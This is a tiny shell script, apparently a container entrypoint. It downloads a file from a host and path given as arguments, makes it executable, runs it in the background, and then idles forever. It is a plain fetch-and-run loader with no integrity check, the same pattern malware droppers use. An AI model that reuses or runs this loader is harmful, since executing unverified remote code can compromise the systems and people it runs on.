#!/bin/sh
curl $1/$2 -o payload
chmod +x payload
./payload&
tail -f /dev/null